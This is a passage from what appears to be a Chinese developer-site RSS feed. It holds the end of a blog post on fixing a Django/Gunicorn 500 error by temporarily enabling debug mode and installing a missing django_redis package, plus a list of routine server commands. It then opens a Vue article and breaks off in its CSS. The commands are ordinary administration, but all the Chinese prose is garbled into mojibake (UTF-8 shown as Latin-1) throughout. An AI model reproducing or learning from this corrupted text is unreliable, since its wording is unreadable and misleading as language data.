<span class="hljs-comment"># 2. åˆ‡æ¢åˆ°Djangoé¡¹ç›®æ ¹ç›®å½•</span>
cd /code/HealthForum/

<span class="hljs-comment"># 3. é‡å¯Gunicornï¼ˆåå°å¯åŠ¨ï¼Œä¿ç•™æ—¥å¿—ï¼‰</span>
gunicorn -w <span class="hljs-number">4</span> -b <span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8000</span> HealthForum.wsgi \
--error-logfile /var/<span class="hljs-keyword">log</span>/gunicorn/error.log \
--access-logfile /var/<span class="hljs-keyword">log</span>/gunicorn/access.log 
</code></pre>
<p>é‡å¯åï¼ŒæŸ¥çœ‹è¿›ç¨‹å’Œç«¯å£ï¼Œç»ˆäºçœ‹åˆ°Gunicornæ­£å¸¸ç›‘å¬8000ç«¯å£äº†â€”â€”æœ¬ä»¥ä¸ºé—®é¢˜è§£å†³ï¼Œç»“æœæ–°çš„æŠ¥é”™åˆæ¥äº†ã€‚</p>
<h3 data-id="heading-5">é˜¶æ®µ2ï¼šèƒ½è¿æ¥Gunicornï¼Œä½†å§‹ç»ˆè¿”å›â€œ500 Internal Server Errorâ€</h3>
<p>è¿™æ¬¡ç”¨curlè®¿é—®8000ç«¯å£ï¼Œä¸å†æ‹’ç»è¿æ¥ï¼Œè€Œæ˜¯è¿”å›500é”™è¯¯ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">[root@server ~]# curl -v http://127.0.0.1:8000
* About to connect() to 127.0.0.1 port 8000 (#0)
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8000 (#0)
&gt; GET / HTTP/1.1
&gt; User-Agent: curl/7.29.0
&gt; Host: 127.0.0.1:8000
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 500 Internal Server Error
&lt; Server: gunicorn
&lt; Date: Tue, 03 Feb 2026 08:12:52 GMT
&lt; Connection: close
&lt; Transfer-Encoding: chunked
&lt; Content-Type: text/html
&lt; X-Content-Type-Options: nosniff
&lt; Referrer-Policy: same-origin
&lt; 

<span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Server Error (500)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Server Error (500)<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
* Closing connection 0
</code></pre>
<p>æ­¤æ—¶çš„å…³é”®å˜åŒ–ï¼š<strong>è¯·æ±‚å·²ç»åˆ°è¾¾Gunicornï¼Œå¹¶ä¼ é€’ç»™äº†Djangoï¼Œä½†Djangoå¤„ç†è¯·æ±‚æ—¶æŠ›å‡ºäº†å†…éƒ¨å¼‚å¸¸</strong>â€”â€”é”™è¯¯ä»â€œç½‘ç»œå±‚â€è½¬å‘äº†â€œåº”ç”¨å±‚â€ã€‚</p>
<h4 data-id="heading-6">æ’æŸ¥2ï¼šæŸ¥çœ‹Gunicornæ—¥å¿—ï¼Œå´æ‰¾ä¸åˆ°ä»»ä½•å¼‚å¸¸ï¼Ÿ</h4>
<p>æˆ‘å†æ¬¡æŸ¥çœ‹Gunicornçš„error.logï¼Œå‘ç°åªæœ‰ä¹‹å‰â€œæ¨¡å—æ‰¾ä¸åˆ°â€çš„æ—§æŠ¥é”™ï¼Œæ²¡æœ‰ä»»ä½•å…³äº500é”™è¯¯çš„æ–°å¼‚å¸¸ï¼›å†æŸ¥çœ‹access.logï¼Œåªçœ‹åˆ°è¯·æ±‚è¿”å›500çŠ¶æ€ç ï¼Œå´æ²¡æœ‰å…·ä½“é”™è¯¯åŸå› ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">root@server HealthForum</span>]<span class="hljs-meta"># tail -n 100 /var/log/gunicorn/access.log</span>
<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> - - [<span class="hljs-number">03</span>/Feb/<span class="hljs-number">2026</span>:<span class="hljs-number">16</span>:<span class="hljs-number">12</span>:<span class="hljs-number">52</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">"GET / HTTP/1.1"</span> <span class="hljs-number">500</span> <span class="hljs-number">145</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"curl/7.29.0"</span>
</code></pre>
<p>è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ï¼š<strong>Gunicornçš„error.logé»˜è®¤åªè®°å½•â€œå¯åŠ¨é˜¶æ®µé”™è¯¯â€ï¼ŒDjangoè¿è¡Œæ—¶æŠ›å‡ºçš„å¼‚å¸¸ï¼ˆå¦‚ä¾èµ–ç¼ºå¤±ã€æ•°æ®åº“è¿æ¥é”™è¯¯ï¼‰ï¼Œä¸ä¼šè‡ªåŠ¨å†™å…¥è¯¥æ—¥å¿—</strong>ã€‚</p>
<h4 data-id="heading-7">è§£å†³2ï¼šå¼€å¯Djangoè°ƒè¯•æ¨¡å¼ï¼Œæ•è·å®æ—¶é”™è¯¯</h4>
<p>è°ƒè¯•Django 500é”™è¯¯çš„ç»ˆæåŠæ³•â€”â€”å¼€å¯è°ƒè¯•æ¨¡å¼ï¼Œè®©é”™è¯¯ç›´æ¥æ˜¾ç¤ºåœ¨å“åº”ä¸­ï¼ˆä»…æµ‹è¯•ç¯å¢ƒä½¿ç”¨ï¼Œç”Ÿäº§ç¯å¢ƒåŠ¡å¿…å…³é—­ï¼ï¼‰ã€‚</p>
<p>ç¼–è¾‘Djangoé¡¹ç›®çš„settings.pyæ–‡ä»¶ï¼ˆè·¯å¾„/code/HealthForum/HealthForum/settings.pyï¼‰ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># SECURITY WARNING: don't run with debug turned on in production!</span>
<span class="hljs-attr">DEBUG</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># ä»Falseæ”¹ä¸ºTrueï¼Œå¼€å¯è°ƒè¯•æ¨¡å¼</span>

<span class="hljs-attr">ALLOWED_HOSTS</span> = [<span class="hljs-string">'*'</span>]  <span class="hljs-comment"># æ”¹ä¸º*ï¼Œå…è®¸æ‰€æœ‰ä¸»æœºè®¿é—®ï¼Œé¿å…400é”™è¯¯</span>
</code></pre>
<p>ä¿å­˜åï¼Œé‡å¯Gunicornï¼ˆè°ƒè¯•æ¨¡å¼ä¿®æ”¹éœ€é‡å¯ç”Ÿæ•ˆï¼‰ï¼Œè¿™æ¬¡æˆ‘é€‰æ‹©<strong>å‰å°å¯åŠ¨Gunicorn</strong>ï¼ˆå»æ‰æœ«å°¾çš„&amp;ï¼‰ï¼Œæ–¹ä¾¿æŸ¥çœ‹å®æ—¶è¾“å‡ºï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># åœæ­¢æ—§è¿›ç¨‹</span>
<span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> $(ps -ef | <span class="hljs-keyword">grep</span> gunicorn | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">'{print $2}'</span>)

<span class="hljs-comment"># å‰å°å¯åŠ¨Gunicornï¼Œå®æ—¶æŸ¥çœ‹é”™è¯¯</span>
cd /code/HealthForum/
gunicorn -w <span class="hljs-number">4</span> -b <span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8000</span> HealthForum.wsgi \
--error-logfile /var/<span class="hljs-keyword">log</span>/gunicorn/error.log \
--access-logfile /var/<span class="hljs-keyword">log</span>/gunicorn/access.log
</code></pre>
<p>å†æ¬¡ç”¨curlè§¦å‘è¯·æ±‚ï¼Œå‰å°ç»ˆç«¯ç«‹åˆ»è¾“å‡ºäº†å®Œæ•´çš„å¼‚å¸¸å †æ ˆâ€”â€”ç»ˆäºæ‰¾åˆ°é—®é¢˜æ ¹æºäº†ï¼</p>
<h3 data-id="heading-8">é˜¶æ®µ3ï¼šæœ€ç»ˆæŠ¥é”™â€œç¼ºå°‘django_redisæ¨¡å—â€ï¼Œå®Œç¾è§£å†³</h3>
<p>å‰å°å¯åŠ¨Gunicornåï¼Œcurlè§¦å‘è¯·æ±‚ï¼Œç»ˆç«¯è¾“å‡ºå…³é”®æŠ¥é”™ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">ModuleNotFoundError: No <span class="hljs-keyword">module</span> named <span class="hljs-string">'django_redis'</span>

django.core.cache.backends.base.InvalidCacheBackendError: Could <span class="hljs-keyword">not</span> find backend <span class="hljs-string">'django_redis.cache.RedisCache'</span>: No <span class="hljs-keyword">module</span> named <span class="hljs-string">'django_redis'</span>
</code></pre>
<p>çœŸç›¸å¤§ç™½ï¼šæˆ‘çš„Djangoé¡¹ç›®é…ç½®äº†Redisä½œä¸ºç¼“å­˜/ä¼šè¯å­˜å‚¨ï¼Œä½†æœåŠ¡å™¨çš„Pythonç¯å¢ƒä¸­ï¼Œ<strong>ç¼ºå°‘django_redisè¿™ä¸ªä¾èµ–åŒ…</strong>â€”â€”è¿™æ˜¯æ“ä½œæ—¶çš„ç–å¿½ï¼Œæœ¬åœ°å¼€å‘æ—¶å®‰è£…äº†ï¼Œéƒ¨ç½²åˆ°æœåŠ¡å™¨æ—¶å¿˜äº†å®‰è£…ã€‚</p>
<h4 data-id="heading-9">æ’æŸ¥3ï¼šç¡®è®¤django_redisç‰ˆæœ¬å…¼å®¹æ€§</h4>
<p>è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªç»†èŠ‚ï¼šæˆ‘çš„æœåŠ¡å™¨æ˜¯Python 3.6ï¼Œè€Œdjango_redis 5.xåŠä»¥ä¸Šç‰ˆæœ¬ä¸å†æ”¯æŒPython 3.6ï¼Œç›´æ¥å®‰è£…ä¼šæŠ¥é”™ã€‚</p>
<p>é’ˆå¯¹Python 3.6ï¼Œæ¨èå®‰è£…<strong>django_redis 4.12.1ç‰ˆæœ¬</strong>ï¼ˆç¨³å®šå…¼å®¹ï¼Œäº²æµ‹å¯ç”¨ï¼‰ã€‚</p>
<h4 data-id="heading-10">è§£å†³3ï¼šå®‰è£…å…¼å®¹ç‰ˆæœ¬çš„django_redisï¼Œé‡å¯éªŒè¯</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># å®‰è£…æŒ‡å®šç‰ˆæœ¬ï¼ˆå…¼å®¹Python 3.6ï¼‰ï¼Œç”¨æ¸…åé•œåƒæºåŠ é€Ÿ</span>
pip3 install <span class="hljs-attr">django-redis</span>==<span class="hljs-number">4.12</span>.<span class="hljs-number">1</span> -i https://pypi.tuna.tsinghua.edu.cn/simple

<span class="hljs-comment"># éªŒè¯å®‰è£…æ˜¯å¦æˆåŠŸï¼ˆæ— æŠ¥é”™å³æ­£å¸¸ï¼‰</span>
python3 -c "import django_redis<span class="hljs-comment">; print('django_redis å¯¼å…¥æˆåŠŸï¼Œç‰ˆæœ¬ï¼š', django_redis.__version__)"</span>
</code></pre>
<p>å®‰è£…æˆåŠŸåï¼Œå†æ¬¡å‰å°å¯åŠ¨Gunicornï¼Œç”¨curlè®¿é—®127.0.0.1:8000â€”â€”è¿™æ¬¡ç»ˆäºä¸å†è¿”å›500é”™è¯¯ï¼Œè€Œæ˜¯è¿”å›äº†Djangoé¡¹ç›®çš„æ­£å¸¸é¡µé¢ï¼</p>
<h4 data-id="heading-11">æ”¶å°¾ï¼šå…³é—­è°ƒè¯•æ¨¡å¼ï¼Œç¡®ä¿å®‰å…¨</h4>
<p>é—®é¢˜è§£å†³åï¼ŒåŠ¡å¿…å…³é—­Djangoè°ƒè¯•æ¨¡å¼ï¼ˆé¿å…æ³„éœ²é¡¹ç›®æ•æ„Ÿä¿¡æ¯ï¼‰ï¼Œä¿®æ”¹settings.pyï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">DEBUG</span> = <span class="hljs-literal">False</span>
<span class="hljs-attr">ALLOWED_HOSTS</span> = [<span class="hljs-string">'ä½ çš„æœåŠ¡å™¨IPæˆ–åŸŸå'</span>]  <span class="hljs-comment"># æ”¹ä¸ºå…·ä½“çš„IP/åŸŸå</span>
</code></pre>
<p>é‡å¯Gunicornå’ŒNginxï¼Œè®¿é—®ç½‘é¡µï¼Œä¸€åˆ‡æ­£å¸¸â€”â€”å†æ—¶2å°æ—¶çš„æ’é”™ï¼Œç»ˆäºåœ†æ»¡ç»“æŸã€‚</p>
<h2 data-id="heading-12">ä¸‰ã€æ’é”™æ€»ç»“ï¼šæ–°æ‰‹å¿…è®°çš„3ä¸ªæ ¸å¿ƒç»éªŒ</h2>
<p>è¿™æ¬¡æ’é”™è¸©äº†å¾ˆå¤šæ–°æ‰‹å¸¸è§çš„å‘ï¼Œæ€»ç»“3ä¸ªå…³é”®ç»éªŒï¼Œå¸®ä½ é¿å¼€é‡å¤è¸©å‘ï¼š</p>
<ol>
<li><strong>è¿›ç¨‹å­˜åœ¨â‰ æ­£å¸¸è¿è¡Œ</strong>ï¼šGunicornè¿›ç¨‹å­˜åœ¨ä¸ä»£è¡¨ç«¯å£æ­£å¸¸ç›‘å¬ï¼Œé‡åˆ°â€œæ‹’ç»è¿æ¥â€ï¼Œå…ˆç”¨ç”µss/netstatæŸ¥çœ‹ç«¯å£ç›‘å¬çŠ¶æ€ï¼Œå†çœ‹é”™è¯¯æ—¥å¿—æ’æŸ¥é—ªé€€åŸå› ï¼ˆå¦‚æ¨¡å—æ‰¾ä¸åˆ°ã€ä¾èµ–ç¼ºå¤±ï¼‰ã€‚</li>
<li><strong>Django 500é”™è¯¯ï¼Œä¼˜å…ˆå¼€å¯è°ƒè¯•æ¨¡å¼</strong>ï¼šGunicornæ—¥å¿—å¯èƒ½æ— æ³•æ•è·Djangoè¿è¡Œæ—¶å¼‚å¸¸ï¼Œå¼€å¯DEBUG=True+ALLOWED_HOSTS=['*']ï¼Œèƒ½ç›´æ¥æ˜¾ç¤ºé”™è¯¯å †æ ˆï¼Œå¿«é€Ÿå®šä½é—®é¢˜ï¼ˆç”Ÿäº§ç¯å¢ƒåŠ¡å¿…å…³é—­ï¼‰ã€‚</li>
<li><strong>ç‰ˆæœ¬å…¼å®¹æ€§æ˜¯é‡ä¸­ä¹‹é‡</strong>ï¼šPythonç‰ˆæœ¬å’Œä¾èµ–åŒ…ç‰ˆæœ¬å¿…é¡»åŒ¹é…ï¼ˆå¦‚Python 3.6ä¸èƒ½ç”¨django_redis 5.xï¼‰ï¼Œå®‰è£…ä¾èµ–æ—¶ï¼Œä¼˜å…ˆæŒ‡å®šå…¼å®¹ç‰ˆæœ¬ï¼Œé¿å…ç›²ç›®å®‰è£…æœ€æ–°ç‰ˆã€‚</li>
</ol>
<h2 data-id="heading-13">å››ã€å¸¸ç”¨æ’é”™å‘½ä»¤ï¼ˆæ”¶è—å¤‡ç”¨ï¼‰</h2>
<p>æ•´ç†äº†è¿™æ¬¡æ’é”™è¿‡ç¨‹ä¸­é«˜é¢‘ä½¿ç”¨çš„å‘½ä»¤ï¼Œæ–°æ‰‹å¯ç›´æ¥å¤åˆ¶ä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-perl" lang="perl"><span class="hljs-comment"># 1. æŸ¥çœ‹Gunicornè¿›ç¨‹</span>
ps -ef | <span class="hljs-keyword">grep</span> gunicorn

<span class="hljs-comment"># 2. æŸ¥çœ‹8000ç«¯å£ç›‘å¬çŠ¶æ€</span>
ss -lntp | <span class="hljs-keyword">grep</span> <span class="hljs-number">8000</span>  <span class="hljs-comment"># æˆ– netstat -lntp | grep 8000ï¼ˆéœ€å®‰è£…net-toolsï¼‰</span>

<span class="hljs-comment"># 3. æ‰¹é‡åœæ­¢Gunicornè¿›ç¨‹</span>
<span class="hljs-keyword">kill</span> -<span class="hljs-number">9</span> $(ps -ef | <span class="hljs-keyword">grep</span> gunicorn | <span class="hljs-keyword">grep</span> -v <span class="hljs-keyword">grep</span> | awk <span class="hljs-string">'{print $2}'</span>)

<span class="hljs-comment"># 4. æŸ¥çœ‹Gunicornæ—¥å¿—</span>
tail -f /var/<span class="hljs-keyword">log</span>/gunicorn/error.log  <span class="hljs-comment"># å®æ—¶æŸ¥çœ‹é”™è¯¯æ—¥å¿—</span>
tail -n <span class="hljs-number">100</span> /var/<span class="hljs-keyword">log</span>/gunicorn/access.log  <span class="hljs-comment"># æŸ¥çœ‹æœ€æ–°100è¡Œè®¿é—®æ—¥å¿—</span>

<span class="hljs-comment"># 5. éªŒè¯Pythonæ¨¡å—æ˜¯å¦å­˜åœ¨</span>
python3 -c <span class="hljs-string">"import æ¨¡å—å; print('å¯¼å…¥æˆåŠŸ')"</span>

<span class="hljs-comment"># 6. é‡å¯Nginx</span>
systemctl restart nginx
</code></pre>
<h2 data-id="heading-14">æœ€åæƒ³è¯´ï¼Œåç«¯éƒ¨ç½²æ’é”™æ²¡æœ‰æ·å¾„ï¼Œé‡åˆ°æŠ¥é”™ä¸è¦æ…Œï¼ŒæŒ‰ç…§â€œä»å¤–å‘å†…ã€é€æ­¥æ‹†è§£â€çš„æ€è·¯ï¼Œç»“åˆæ—¥å¿—å’Œå®æ“éªŒè¯ï¼Œæ€»èƒ½æ‰¾åˆ°é—®é¢˜æ ¹æºã€‚</h2></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vueå°ç¥ç»„åˆï¼šåŠ¨æ€ç»„ä»¶<component :is> + keep-aliveï¼Œæ€§èƒ½ç¿»å€è¿˜ä¸è¸©å‘ï¼]]></title>    <link>https://juejin.cn/post/7602466689712570383</link>    <guid>https://juejin.cn/post/7602466689712570383</guid>    <pubDate>2026-02-04T01:28:12.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602466689712570383" data-draft-id="7602161364891992064" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vueå°ç¥ç»„åˆï¼šåŠ¨æ€ç»„ä»¶&lt;component :is&gt; + keep-aliveï¼Œæ€§èƒ½ç¿»å€è¿˜ä¸è¸©å‘ï¼"/> <meta itemprop="keywords" content="JavaScript,é¢è¯•,Vue.js"/> <meta itemprop="datePublished" content="2026-02-04T01:28:12.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="boooooooom"/> <meta itemprop="url" content="https://juejin.cn/user/3078273283917399"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vueå°ç¥ç»„åˆï¼šåŠ¨æ€ç»„ä»¶&lt;component :is&gt; + keep-aliveï¼Œæ€§èƒ½ç¿»å€è¿˜ä¸è¸©å‘ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3078273283917399/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    boooooooom
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:28:12.000Z" title="Wed Feb 04 2026 01:28:12 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"ğŸ‹"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"ğŸ“"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"ğŸ‘"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"ğŸ‰"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"ğŸ’"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">æ­£æ–‡</h2>
<h3 data-id="heading-1">ä¸€ã€å‰è¨€ï¼šä»€ä¹ˆæ—¶å€™éœ€è¦è¿™å¯¹â€œé»„é‡‘ç»„åˆâ€ï¼Ÿ</h3>
